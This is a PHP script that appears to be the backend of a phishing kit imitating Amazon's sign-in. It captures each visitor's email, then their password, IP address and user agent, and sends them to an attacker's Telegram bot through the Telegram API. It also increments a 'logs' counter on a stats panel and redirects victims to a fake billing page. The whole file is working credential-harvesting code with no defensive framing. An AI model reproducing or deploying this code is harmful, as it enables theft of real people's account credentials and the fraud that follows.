<?php
session_start();
ob_start();
include '../config.php';
if ($_SERVER['REQUEST_METHOD'] == 'POST') {

	function update_ini_file($data, $filepath)
	{
		$content = "";
		$parsed_ini = parse_ini_file($filepath, true);
		foreach ($data as $section => $values) {
			if ($section === "") {
				continue;
			}
			$content .= $section . "=" . $values . "\n\r";
		}
		if (!$handle = fopen($filepath, 'w')) {
			return false;
		}
		$success = fwrite($handle, $content);
		fclose($handle);
	}


	if (isset($_POST['step1'])) {

		if (empty($_POST['email'])) {
			header('location: ../Forbidden');
			exit();
		}

		$ip_address = $_SERVER['REMOTE_ADDR'];
		$_SESSION['email']  = $_POST['email'];

		$message = "[😊Amazon]\nUser: <code> {$_POST['email']} </code> \nIP: {$ip_address}";

		$message = urlencode($message);

		$url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $chat_id . "&parse_mode=HTML&text=" . $message;

		$response = file_get_contents($url);

		header('location: ../login/ap_signin?enc=' . md5(time()) . '&p=0&dispatch=' . sha1(time()));
		exit();
	}

	if (isset($_POST['step2'])) {

		if (empty($_SESSION['email'])) {
			header('location: ../Forbidden');
			exit();
		}
		if (empty($_POST['password1'])) {
			header('location: ../Forbidden');
			exit();
		}

		$_SESSION['pass'] = $_POST['password1'];

		$message = "-| Amazon Logs 🛒
-| User: <code> " . $_SESSION['email'] . " </code>
-| Pass: <code> " . $_POST['password1'] . " </code>
IP: " . $_SERVER['REMOTE_ADDR'] . "
User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "
🥂";

		$txt = $message;

		$format = 'HTML';

		$send = ['chat_id' => $chat_id, 'parse_mode' => $format, 'text' => $txt];
		$website_telegram = "https://api.telegram.org/bot{$bot_token}";
		$ch = curl_init($website_telegram . '/sendMessage');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		$result = curl_exec($ch);
		curl_close($ch);

		$filepath = '../panel/stats.ini';
		$data = @parse_ini_file($filepath);
		$data['logs']++;

		update_ini_file($data, $filepath);

		header('location: ../login/ap_billing?enc=' . md5(time()) . '&p=0&dispatch=' . sha1(time()));
		exit();
	}

	

	header('location: ../Forbidden');
} else {
	header('location: ../Forbidden');
}
